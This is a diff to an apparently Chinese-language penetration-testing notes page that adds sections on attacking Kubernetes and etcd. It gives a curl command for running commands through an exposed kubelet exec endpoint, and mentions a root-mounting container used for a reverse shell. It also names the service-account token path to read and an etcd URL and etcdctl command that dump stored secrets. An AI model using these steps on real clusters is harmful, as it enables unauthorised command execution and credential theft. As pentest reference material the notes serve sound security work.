@@ -560,6 +560,20 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#k8s" class="md-nav__link">
+    k8s
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#etcd" class="md-nav__link">
+    etcd
+  </a>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -3559,6 +3573,20 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#k8s" class="md-nav__link">
+    k8s
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#etcd" class="md-nav__link">
+    etcd
+  </a>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -3619,6 +3647,18 @@ Todo:
 <h2 id="ewebeditor-28-55">eWebEditor 2.8 5.5<a class="headerlink" href="#ewebeditor-28-55" title="Permanent link">&para;</a></h2>
 <h2 id="weblogic">weblogic<a class="headerlink" href="#weblogic" title="Permanent link">&para;</a></h2>
 <p><a href="https://github.com/hktalent/CVE_2020_2546">https://github.com/hktalent/CVE_2020_2546</a></p>
+<h2 id="k8s">k8s<a class="headerlink" href="#k8s" title="Permanent link">&para;</a></h2>
+<ol>
+<li>直接访问端口，得到所有可用的API，如果配置了ui直接访问<code>/ui</code></li>
+<li>创建容器挂在根目录，反弹shell</li>
+<li>通过kubelet API /pods路径获得容器运行信息。可以实现命令执行<code>curl --insecure -v -H "X-Stream-Protocol-Version: v2.channel.k8s.io" -H "X-Stream-Protocol-Version: channel.k8s.io" -X POST "https://kube-node-here:10250/exec/&lt;namespace&gt;/&lt;podname&gt;/&lt;container-name&gt;?command=touch&amp;command=hello_world&amp;input=1&amp;output=1&amp;tty=1"</code> 通过wscat进行连接。</li>
+<li>读取<code>/run/secrets/kubernetes.io/serviceaccount/token</code>获得token就可以和k8s通信，如果Kubernetes增加了RBAC授权，可能无法使用token进行通信。</li>
+</ol>
+<h2 id="etcd">etcd<a class="headerlink" href="#etcd" title="Permanent link">&para;</a></h2>
+<ol>
+<li>访问master节点的<code>/v2/keys/?recursive=true</code> 可以得到所有密钥</li>
+<li>使用etcdctl<code>etcdctl --endpoint=http://[etcd_server_ip]:2379 ls</code></li>
+</ol>
                 
               
               
